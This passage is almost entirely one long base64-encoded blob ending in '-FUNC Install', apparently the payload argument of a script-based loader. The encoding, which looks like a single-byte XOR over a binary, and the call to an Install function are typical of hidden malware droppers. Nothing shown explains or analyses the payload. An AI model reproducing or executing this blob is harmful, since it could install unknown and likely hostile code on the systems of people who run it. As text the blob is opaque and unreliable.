ZFxeT2RcXx40VF5PZFxey2BcXO7EVF7/YFxcyxxcXV7EVFz/HFxe6xxcXR7EVF6PHFxf0xxcXx40VFx/GFxdFxhcX440VF0PGFxcjxBcXY7EVFyPEFxdxxBcX440VF3/EFxdrxBcX440VF2vEFxeZxBcX440VF4fEFxenxBcX440VF6fEFxfXxBcX440VF9fEFxeswhcXB7AVF8fCFxeXwBcXl7EVF7/AFxfFwBcXx40VF8PAFxd2zxcXd7gVF3PPFxeezxcXx40VF5vPFxd0zhcXk7EVF5fOFxfSyhcXj7EVF9/KFxfwyhcX440VF//KFxciyRcXx40VFy/JFxdGyRcX440VF0PJFxcbyBcX140VFxvIFxdcyBcX440VF1vIFxd5yBcX440VF2fIFxeAyBcX440VF4/IFxfWyBcXx40VF8fIFxcc9xcXh7cVFwP3FxeX9xcXx40VF5f3Fxeo9xcXx40VF/f3Fxe29hcXn7AVF7P2Fxc99RcXh7cVFzv1Fxft8RcXf7AVF+vxFxdx/hcXt7AVF3/+Fxct/RcXr7AVF0/9FxcO/BcX87EVFwv8Fxfr+xcXw7AVF+v7Fxfx+RcXi7EVF//5Fxds5xcXO7AVF2vnFxfZ5RcXB7AVF8flFxcZ4xcXa4gVFwfjFxdB4xcXx40VF0/jFxeY4xcXx40VF4fjFxdx4RcXr7AVF3/hFxeu4RcXh7cVF6vhFxcH4BcXh7cVFwfgFxdz4BcXh7cVF3PgFxfc4BcX140VF9vgFxdU7xcXy4oVF1PvFxeQ7xcXA78VF5/vFxfR7xcXC78VFxfuFxcz7hcXP78VFyfuFxdf7hcXJ78VF0fuFxdG7hcXI78VF3fuFxd27hcXL78VF6fuFxfn7hcXV78VF+fuFxes7BcXX78VF6vsFxd16xcXy4oVF3PrFxf86xcX978VF/vrFxdu6hcX978VF2vqFxfA6hcX978VF8/qFxdw6RcXh7cVF3/pFxfC6RcXh7cVF8/pFxdt6BcXh78VF2voFxeVFhYXl78VF5MWFhfvFhYXx40VF+8WFheYFRYX440VF4cVFhccExYX440VFxsTFheXERYXs78VFxcQFhcPHhYXq78VFw8eFhfzHhYXh7cVF/MeFhewHBYXT4sVF78cFheUGxYX140VF5MbFhcKGhYXx40VFzcaFhfiGhYX378VF+8aFheMGRYXf78VF7MZFhfaGRYX440VF8cZFhfxGRYXx40VF/8ZFhdqGBYXx40VF5cYFhepGBYX/78VF9cYFhfOBRYX578VF8sFFhcSBBYXb4oVFzcEFheVAxYXB74VF48DFhc2ARYXy4oVFzMBFhdLARYXV74VF0sBFhcjABYXN74VF1cAFhfrABYXA74VF+sAFhdRDxYXx40VF18PFhe0DxYXx40VF8cPFhecDRYXu74VF5sNFhf+DRYXx40VF/sNFhdkCxYXc74VF2MLFhf3CxYXh7cVF/cLFhf9ChYXk74VF/sKFhc6CRYXb74VFycJFhddCRYX440VF1sJFhdxCRYX440VF38JFhe3CRYX440VF78JFhf0CRYX+74VF/MJFhcICBYX374VFzcIFhf0NxYXu74VF/M3Fhc6NRYXr7AVF1c1FhdtNRYXs74VF6s1FhcTNBYXi74VFw80FhcsNBYX440VFys0FhdbNBYX440VF0c0Fhe2NBYXx40VF7s0Fhf7NBYXx40VF/s0FhdQMxYX440VF0szFhdnMxYX440VF2czFheXMxYX440VF5czFheiMxYX440VF68zFhffMxYX440VF98zFhc7MhYXy4oVFzsyFhd+MhYXh7cVF58yFhegMhYXx40VF68yFhf7MhYXB70VF+MyFhcDMRYXJ70VF0MxFheNMRYX440VF4sxFhdYMBYXb7oVF0cwFheaMBYXN7gVF4cwFhf5MBYXx40VF+cwFhdYPxYXx40VF0c/FhexPxYX440VF78/FhcKPhYXx40VF1s+FhewPRYXR70VF6c9FhdJPBYXZ70VF3c8FhdpPBYXb4oVF5c8FhfQPBYX440VF988FhcsOxYXk70VFys7FheXOxYXx40VF5c7FhepOhYXm70VF9c6Fhf9OhYX440VFyM5FheVORYXh7cVF5M5FhezORYX440VF7M5FhfTORYX440VF9M5Fhf5ORYXb4oVF+c5FhchJxYXi70VF1cnFhfUJhYXo70VF9MmFhfPJhYXb4oVF/MjFhc0IhYXw70VFzMiFhd2IhYXV7wVF3MiFhe+IhYX770VF7siFhccIRYXC7wVFxshFhfOIRYX070VF8shFhfrIRYXN7gVF+shFhfmIBYX270VF+MgFhdMLxYXh7cVF0svFheKLxYXx40VF7cvFhd8LhYXh7cVF3s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cFhc13BYXr7YVF1fcFhd+3BYX17YVF2fcFher3BYX07YVF8fcFhfA3BYX37YVF/fcFhf13BYX27YVF5fbFheP2xYX+7cVF4/bFhe42xYXO7kVF7jbFhfc2xYXO7kVF9zbFhcW2hYXa7YVFxbaFheF2hYXN7EVF4XaFhe92hYXO7kVF73aFhfY2hYXO7kVF9jaFhdQ2RYXz7EVF1DZFhdK2RYXO7kVF0rZFheX2RYXO7kVF5fZFheM2RYXO7kVF4zZFhem2RYXO7kVF6bZFhfc2RYXO7kVF9zZFhfy2RYXO7kVF/LZFhfp2RYXO7kVF+nZFhcA2BYXO7kVFwDYFhcv2BYXO7kVFy/YFhdE2BYXO7kVF0TYFhdn2BYXO7kVF2fYFhee2BYXO7kVF57YFhe12BYXO7kVF7XYFheu2BYXO7kVF67YFhfG2BYXO7kVF8bYFhf82BYXO7kVF/zYFhcAxxYXO7kVFzfHFhdXxxYXO7kVF1fHFhdrxxYX440VF2vHFheJxxYX440VFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF/cWF0cXFxc3sj+yJ7Ivsl+yR7J/smeyb7KHso+yt7LXst+yz7L3sv+yH7EHsQ+xJ7EvsVexd7F/sc+x/7HvsR+wD7A/sC+wX7BPsH+wFxcXBxUX4xcXF2e1b7WXtZ+1h7WPtbe1v7Wnta+1T7S3tL+0p7TftMe0z7Q3sj+yJ7IvsleyX7JHsk+yd7J/smeyb7KXsp+yh7KPsreyv7Knsq+y17Lfsseyz7L3sv+y57LvshexH7EHsQ+xN7E/sSexL7FXsV+xR7FPsXexf7FnsW+xl7GfsYexj7G3sb+xp7Gvsdex37HHsc+x97H/seex77EXsB+wB7APsDewP7AnsC+wV7BfsEewT7B3sH+wZ7BvsJewn7CHsI+wt7C/sKewr7DXsN+wx7DPsPew/7DnsO+wF78fvwe/D783vz+/J78vv1e/FzcVFwcWFxdXt0e3d7d/t2e3b7eXt5+3h7ePt7+3p7evt9e337fHt8+397fvtx+2D7Y3tj+2J7Yvthe0H7QHtA+0N7Q/tCe0L7RXtF+0R7RPtHe0f7RntG+0l7SftIe0j7S3tL+0p7SvtNe037THtM+097T/tOe077QXsx+zB7MPszezP7Mnsy+zV7Nfs0ezd7N/s2ezb7OXs5+zh7OPs7ezv7Ons6+z17Pfs8ezz7P3s/+z57PvsxeyH7IHsg+yN7I/sieyL7JXsl+yR7JPsneyf7Jnsm+yl7Kfsoeyj7K3sr+yp7Kvspe+n76Hvo++t76/vqe+r77Xvt++x77Pvve+/77nvu++F70fvQe9D70XJxUXBxcXFyeyL7JXsl+yF1cVF8sXFxdnvpe+h763vqe+177Hvve+574XvQe9N70nvVe9R713vWe9l72Hvbe9p73Xvce9973nvRe8B7w3vCe8V7xHvHe8Z7yXvIe8t7ynvNe8x7z3vOe8F7sHuze7J7tXu0e7d7tnu5e7h7u3u6e717vHu/e757sXuge6N7onule6R7p3ume6l7qHure6p7rXuse697rnuhe5B7k3uSe5V7lHuXe5Z7mXuYe5t7mnude5x7n3uee5F7gHuDe4J7hXuEe4d7hnuJe4h7i3uKe417jHuPe457gXFxdHFRcXFhcXF7cHtze3J7dXt0e3d7dnt5e3h7e3t6e317fHt/e357cXtge2N7Yntle2R7Z3tme2l7aHtre2p7bXtse297bnthe1B7U3tSe1V7VHtXe1Z7WXtYe1t7Wntde1x7X3tee1F7QHtDe0J7RXtEe0d7RntJe0h7S3tKe017THtPe057QXswezN7Mns1ezR7N3s2ezl7OHs7ezp7PXs8ez97PnsxeyB7I3sieyV7JHsneyZ7KXsoeyt7Knsteyx7L3sueyF7EHsTexJ7FXsUexd7FnsZexh7G3saex17HHsfex57EXsAewN7AnsFewR7B3sGewl7CHsLewFxcXdxUX3xYXFw+1P7UvtV+1T7V/tW+1n7WPtb+1r7Xftc+1/7XvtR+0D7Q/tC+0X7RPtH+0b7SftI+0v7SvtN+0z7T/tO+0H7MPsz+zL7Nfs0+zf7Nvs5+zj7O/s6+z37PPs/+z77Mfsg+yP7Ivsl+yT7J/sm+yn7KPsr+yr7Lfss+y/7Lvsh+xD7E/sS+xX7FPsX+xb7GfsY+xv7Gvsd+xz7H/se+xH7APsD+wL7BfsE+wf7BvsJ+wj7C/sK+w37DPsP+w77Afvw+/P78vv1+/T79/v2+/n7+Pv7+/r7/fv8+//7/vvx++D74/vi++X75Pvn++b76fvo++v76vvt++z77/vu++H70PvT+9L71fvU+9f71vvZ+9j72/va+9373Pvf+9770fvA+8P7wvvF+8T7x/vG+8n7yPvL+8r7zfvM+8/7zvvB+7D7s/uy+7X7tPu3+7b7ufu4+7v7uvu9+7z7v/u++7H7oPuj+6L7pfuk+6f7pvup+6j7q/uq+637rPuv+677ofuQ+5P7kvuV+5T7l/uW+5n7mPub+5r7nfuc+5/7nvuR+4D7g/uC+4X7hPuH+4b7ifuI+4v7ivuN+4z7j/uO+4FxcXZxUXAxcXFx+3D7c/ty+3X7cXFxeXFRc7FxcX17nfuce5z7n3uf+557nvuRe4H7gHuA+4N7g/uCe4L7hXuBcXF4cVFw8XFxePs6ezr7MHsg+yP7IvsleyF8cVF08XFxcnty+3R7dPt2+317YftT+1X7V/tZ+1r7XHtc+197UPtDe0l7+fv4e/j7+3v7+/p7+vv9e/37/Pv/e//7/nv++/F74fvge+B7gvuHe4h7inuBcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc="  -FUNC Install
